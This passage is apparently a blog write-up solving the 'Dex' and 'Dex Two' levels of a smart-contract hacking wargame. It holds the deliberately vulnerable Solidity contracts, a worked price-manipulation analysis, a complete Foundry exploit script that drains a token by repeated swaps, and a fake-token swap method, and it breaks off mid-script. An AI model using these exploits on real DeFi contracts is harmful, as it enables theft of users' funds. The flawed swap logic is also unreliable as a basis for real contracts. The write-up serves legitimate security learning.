    <span class="nf">require</span><span class="p">((</span><span class="k">from</span> <span class="o">==</span> <span class="nx">token1</span> <span class="o">&amp;&amp;</span> <span class="nx">to</span> <span class="o">==</span> <span class="nx">token2</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="k">from</span> <span class="o">==</span> <span class="nx">token2</span> <span class="o">&amp;&amp;</span> <span class="nx">to</span> <span class="o">==</span> <span class="nx">token1</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Invalid tokens</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">require</span><span class="p">(</span><span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Not enough to swap</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">uint</span> <span class="nx">swapAmount</span> <span class="o">=</span> <span class="nf">getSwapPrice</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">swapAmount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">swapAmount</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">getSwapPrice</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
    <span class="nf">return</span><span class="p">((</span><span class="nx">amount</span> <span class="o">*</span> <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nc">SwappableToken</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">SwappableToken</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">account</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
    <span class="k">return</span> <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">SwappableToken</span> <span class="nx">is</span> <span class="nx">ERC20</span> <span class="p">{</span>
  <span class="nx">address</span> <span class="kr">private</span> <span class="nx">_dex</span><span class="p">;</span>
  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">dexInstance</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">symbol</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">initialSupply</span><span class="p">)</span> <span class="nc">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">symbol</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">initialSupply</span><span class="p">);</span>
        <span class="nx">_dex</span> <span class="o">=</span> <span class="nx">dexInstance</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">owner</span> <span class="o">!=</span> <span class="nx">_dex</span><span class="p">,</span> <span class="dl">"</span><span class="s2">InvalidApprover</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">super</span><span class="p">.</span><span class="nf">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.</li>
  <li>You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.</li>
  <li>There is a <code class="language-plaintext highlighter-rouge">swap()</code> function inside Dex contract which swaps one token for another. Inside <code class="language-plaintext highlighter-rouge">swap()</code> intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.</li>
  <li>Observe that the <code class="language-plaintext highlighter-rouge">getSwapPrice()</code> is used to get the amount of tokens to be transferred to the <code class="language-plaintext highlighter-rouge">to</code> address.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  uint swapAmount = getSwapPrice(from, to, amount);
  IERC20(from).transferFrom(msg.sender, address(this), amount);
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
</code></pre></div>    </div>
  </li>
  <li>The <code class="language-plaintext highlighter-rouge">amount</code> is the amount of the tokens that added to the balance of <code class="language-plaintext highlighter-rouge">Dex</code> contract.</li>
  <li><code class="language-plaintext highlighter-rouge">swapAmount</code> is the amount of tokens that goes to the <code class="language-plaintext highlighter-rouge">to</code> address from the balance of the <code class="language-plaintext highlighter-rouge">Dex</code> contract.</li>
  <li>I tried calculating for swapAmout to find is there any chance that happens for the <code class="language-plaintext highlighter-rouge">swapAmount &gt; amount</code>. So, that the <code class="language-plaintext highlighter-rouge">to</code> address will get more tokens than they sent.</li>
  <li>
    <p>I have observed that swapping between two tokens slightly increases the balance of the <code class="language-plaintext highlighter-rouge">to</code> address.</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> swap(token1, token2, 10)  
   swapAmount = (10 * 100)//100 = 10
   ==&gt;  balance of player in token1 = 10 - amount = 0
   ==&gt;  balance of player in token2 = 10 + swapAmount = 20
    
   ==&gt;  balance of Dex in token1 = 110
   ==&gt;  balance of Dex in token2 = 100 - swapAmount = 90

 swap(token2, token1, 20) 
   swapAmount  = (20 * 110) // 90 = 24
   ==&gt;  balance of player in token2 = 20 - amount = 0
   ==&gt;  balance of player in token1 = 0 + swapAmount = 24
    
   ==&gt;  balance of Dex in token2 = 90 + amount
   ==&gt;  balance of Dex in token1 = 110 - swapAmount = 110 - 24 = 86
</code></pre></div>    </div>
  </li>
  <li>Here you can see that the after each swap <code class="language-plaintext highlighter-rouge">swapAmount</code> is becoming greater than the amount the comes in.</li>
  <li>After doing 5 swaps we need to do 45 amount of tokens swap from token2 to token1 which will make token2 balance of <code class="language-plaintext highlighter-rouge">Dex</code> zero.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">DexSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Dex</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Dex.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/IERC20.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">DexSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Dex</span> <span class="kr">public</span> <span class="nx">dex</span> <span class="o">=</span> <span class="nc">Dex</span><span class="p">(</span><span class="mh">0x13dC383F59782676f31c55baa715C6F24E4d8CF5</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>

        <span class="nx">address</span> <span class="nx">token1</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nf">token1</span><span class="p">());</span>
        <span class="nx">address</span> <span class="nx">token2</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">.</span><span class="nf">token2</span><span class="p">());</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Token 1 : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token1</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Token 2 : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">token2</span><span class="p">);</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>

        <span class="nx">Attack</span> <span class="nx">attack</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Attack</span><span class="p">();</span>
        
        <span class="nx">dex</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">),</span> <span class="mi">10</span><span class="p">);</span>

        <span class="nx">attack</span><span class="p">.</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attacker balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attacker balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">attack</span><span class="p">)));</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN1 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">DEX balance in TOKEN2 </span><span class="dl">"</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">)));</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Dex</span> <span class="kr">public</span> <span class="nx">dex</span> <span class="o">=</span> <span class="nc">Dex</span><span class="p">(</span><span class="mh">0x13dC383F59782676f31c55baa715C6F24E4d8CF5</span><span class="p">);</span>
    <span class="nx">address</span> <span class="nx">token1</span> <span class="o">=</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">token1</span><span class="p">();</span>
    <span class="nx">address</span> <span class="nx">token2</span> <span class="o">=</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">token2</span><span class="p">();</span>
    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
        <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="mh">0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="mi">10</span><span class="p">);</span>
        <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="mh">0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="mi">10</span><span class="p">);</span>
        
        <span class="nx">dex</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">dex</span><span class="p">),</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>

        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nx">token2</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nx">token1</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nx">token2</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nx">token1</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nx">token2</span><span class="p">,</span> <span class="nx">dex</span><span class="p">.</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">token1</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>

        <span class="nx">dex</span><span class="p">.</span><span class="nf">swap</span><span class="p">(</span><span class="nx">token2</span><span class="p">,</span> <span class="nx">token1</span><span class="p">,</span> <span class="mi">45</span><span class="p">);</span>        
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/DexSolve.s.sol:DexSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="23-dex-two">23 Dex Two</h1>

<p><code class="language-plaintext highlighter-rouge">DexTwo.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/IERC20.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">'</span><span class="s1">openzeppelin-contracts/contracts/access/Ownable.sol</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">DexTwo</span> <span class="nx">is</span> <span class="nc">Ownable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span> <span class="p">{</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">token1</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">token2</span><span class="p">;</span>
  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{}</span>

  <span class="kd">function</span> <span class="nf">setTokens</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_token1</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_token2</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">token1</span> <span class="o">=</span> <span class="nx">_token1</span><span class="p">;</span>
    <span class="nx">token2</span> <span class="o">=</span> <span class="nx">_token2</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">add_liquidity</span><span class="p">(</span><span class="nx">address</span> <span class="nx">token_address</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Not enough to swap</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">uint</span> <span class="nx">swapAmount</span> <span class="o">=</span> <span class="nf">getSwapAmount</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">swapAmount</span><span class="p">);</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">swapAmount</span><span class="p">);</span>
  <span class="p">}</span> 

  <span class="kd">function</span> <span class="nf">getSwapAmount</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
    <span class="nf">return</span><span class="p">((</span><span class="nx">amount</span> <span class="o">*</span> <span class="nc">IERC20</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))</span><span class="o">/</span><span class="nc">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nc">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token1</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
    <span class="nc">SwappableTokenTwo</span><span class="p">(</span><span class="nx">token2</span><span class="p">).</span><span class="nf">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">account</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
    <span class="k">return</span> <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nf">balanceOf</span><span class="p">(</span><span class="nx">account</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">SwappableTokenTwo</span> <span class="nx">is</span> <span class="nx">ERC20</span> <span class="p">{</span>
  <span class="nx">address</span> <span class="kr">private</span> <span class="nx">_dex</span><span class="p">;</span>
  <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">dexInstance</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">symbol</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">initialSupply</span><span class="p">)</span> <span class="nc">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">symbol</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">initialSupply</span><span class="p">);</span>
        <span class="nx">_dex</span> <span class="o">=</span> <span class="nx">dexInstance</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="nx">owner</span> <span class="o">!=</span> <span class="nx">_dex</span><span class="p">,</span> <span class="dl">"</span><span class="s2">InvalidApprover</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">super</span><span class="p">.</span><span class="nf">_approve</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>Observe that the <code class="language-plaintext highlighter-rouge">DexTwo</code> modifies the <code class="language-plaintext highlighter-rouge">swap()</code> function from the <code class="language-plaintext highlighter-rouge">Dex</code>. It removed the check of valid tokens.</li>
  <li>So, we are now allowed to input any token addresses to the swap() function.</li>
  <li>I created two Fake Tokens and transferred 100 tokens each of the two tokens to the <code class="language-plaintext highlighter-rouge">Dex</code> address.</li>
  <li>I swapped my fake tokens with the <code class="language-plaintext highlighter-rouge">token1</code> and <code class="language-plaintext highlighter-rouge">token2</code> balances of the <code class="language-plaintext highlighter-rouge">Dex</code> contract.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">DexTwoSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Dex</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Dex.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/IERC20.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>



<span class="nx">contract</span> <span class="nx">DexTwoSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Dex</span> <span class="kr">public</span> <span class="nx">dex</span> <span class="o">=</span> <span class="nc">Dex</span><span class="p">(</span><span class="mh">0xd8c665Dac001720A9efa0f478e63CABc5D64E9e9</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
